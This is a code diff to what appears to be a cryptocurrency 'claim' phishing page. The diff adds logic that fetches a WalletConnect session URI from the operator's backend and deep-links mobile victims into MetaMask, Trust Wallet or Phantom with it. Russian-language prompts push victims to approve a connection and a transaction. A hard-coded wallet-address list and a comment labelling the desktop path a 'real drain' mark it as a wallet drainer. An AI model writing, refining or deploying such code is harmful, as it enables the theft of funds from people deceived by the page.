@@ -15,7 +15,7 @@
     @keyframes pulse { 0% { text-shadow: 0 0 15px #a855f7; } 100% { text-shadow: 0 0 35px #c026d3; } }
     .btn { background: linear-gradient(90deg, #7c3aed, #ec4899); padding: 1.2rem 2.5rem; border-radius: 999px; font-weight: bold; transition: all 0.3s; cursor: pointer; }
     .btn:hover { transform: scale(1.06); box-shadow: 0 0 40px #a855f7; }
-    .claim-btn { background: linear-gradient(90deg, #22c55e, #4ade80); padding: 1.4rem 3rem; border-radius: 999px; font-weight: bold; font-size: 1.5rem; margin: 2rem auto; display: block; width: 90%; max-width: 400px; text-align: center; transition: all 0.3s; }
+    .claim-btn { background: linear-gradient(90deg, #22c55e, #4ade80); padding: 1.4rem 3rem; border-radius: 999px; font-weight: bold; font-size: 1.5rem; margin: 2rem auto; display: block; width: 90%; max-width: 400px; text-align: center; transition: all 0.3s; cursor: pointer; }
     .claim-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px #22c55e; }
     .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
     .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 460px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; }
@@ -140,30 +140,48 @@
       'Sui': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000'
     };
 
+    async function getUri() {
+      try {
+        const r = await fetch(`${BACKEND}/get-wc-uri`);
+        const d = await r.json();
+        return d.uri || null;
+      } catch (e) {
+        console.error('Backend fetch error:', e);
+        return null;
+      }
+    }
+
     function showModal() {
       document.getElementById('modal').style.display = 'flex';
     }
 
-    function connect(wallet) {
+    async function connect(wallet) {
+      const uri = await getUri();
+      if (!uri) {
+        alert('Ошибка сессии — попробуй позже');
+        return;
+      }
+
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
       if (isMobile) {
         let dl = '';
-        if (wallet === 'MetaMask') dl = 'metamask://';
-        if (wallet === 'Trust Wallet') dl = 'trust://';
-        if (wallet === 'Phantom') dl = 'phantom://';
+        if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
+        if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
+        if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
 
         if (dl) {
+          console.log('Открываем:', dl);
           window.location.href = dl;
           setTimeout(() => {
             alert('Подтверди подключение и транзакцию в кошельке');
-          }, 800);
+          }, 1000);
           document.getElementById('modal').style.display = 'none';
           return;
         }
       }
 
-      alert('Open this link inside ' + wallet + ' browser for auto connect');
+      alert('Открой эту ссылку внутри кошелька для автоматического подключения');
     }
 
     // ПК — реальный слив
@@ -227,5 +245,4 @@
     });
   </script>
 </body>
-
 </html>
